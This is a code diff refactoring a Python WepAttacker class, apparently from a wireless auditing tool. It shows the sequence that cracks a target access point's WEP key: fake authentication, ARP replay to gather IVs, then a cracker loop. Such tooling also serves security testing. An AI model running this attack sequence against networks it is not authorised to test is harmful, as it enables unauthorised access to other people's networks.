@@ -32,7 +32,6 @@ import logging
 import os
 import re
 import subprocess
-import tempfile
 import time
 from enum import Enum, unique
 from typing import Dict
@@ -449,17 +448,17 @@ class WepAttacker(object):
             #  AP already cracked
             logger.info('Known ' + str(self.ap))
             return
-        with tempfile.TemporaryDirectory() as tmp_dirname:
-            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
-            capturer.start(self.ap)
-
-            with FakeAuthentication(interface=self.monitoring_interface, ap=self.ap) as fake_authentication:
+        with WirelessCapturer(interface=self.monitoring_interface,
+                              ap=self.ap) as capturer:
+            with FakeAuthentication(interface=self.monitoring_interface,
+                                    ap=self.ap) as fake_authentication:
                 time.sleep(1)
 
                 # authenticate
                 while fake_authentication.state != FakeAuthentication.State.SENDING_KEEP_ALIVE:
                     fake_authentication.update()
-                    logger.debug(str(fake_authentication))
+                    logger.debug(fake_authentication)
+
                     if fake_authentication.flags['needs_prga_xor']:
                         # stop fakeauth without prga_xor
                         fake_authentication.stop()
@@ -481,6 +480,7 @@ class WepAttacker(object):
                             time.sleep(1)
                         else:
                             logger.info('Network not detected by capturer yet.')
+
                     if fake_authentication.flags['deauthenticated']:
                         # wait and restart fakeauth
                         fake_authentication.cleanup()
@@ -488,6 +488,7 @@ class WepAttacker(object):
                         time.sleep(5)
                         fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
                     time.sleep(2)
+
                     if fake_authentication.state == FakeAuthentication.State.TERMINATED and\
                             not (fake_authentication.flags['needs_prga_xor'] or
                                  fake_authentication.flags['deauthenticated']):
@@ -495,22 +496,30 @@ class WepAttacker(object):
                         raise subprocess.CalledProcessError(returncode=fake_authentication.poll(),
                                                             cmd=fake_authentication.args)
 
-                with ArpReplay(interface=self.monitoring_interface, ap=self.ap,
+                with ArpReplay(interface=self.monitoring_interface,
+                               ap=self.ap,
                                source_mac=self.monitoring_interface.mac_address) as arp_replay:
                     # some time to create capture capturer.capturing_cap_path
                     while int(capturer.get_iv_sum()) < 100:
+                        capturer.update()
                         fake_authentication.update()
                         arp_replay.update()
-                        logger.debug(str(fake_authentication))
+
+                        logger.debug(capturer)
+                        logger.debug(fake_authentication)
                         logger.debug(arp_replay)
+
                         time.sleep(1)
 
-                    with WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap) as cracker:
+                    with WepCracker(cap_filepath=capturer.capturing_cap_path,
+                                    ap=self.ap) as cracker:
                         while not self.ap.is_cracked():
+                            capturer.update()
                             fake_authentication.update()
                             arp_replay.update()
                             cracker.update()
 
+                            logger.debug(capturer)
                             logger.debug(fake_authentication)
                             logger.debug(arp_replay)
                             logger.debug(cracker)
@@ -518,5 +527,3 @@ class WepAttacker(object):
 
                             time.sleep(2)
                         logger.info('Cracked ' + str(self.ap))
-                        capturer.stop()
-                        capturer.clean()
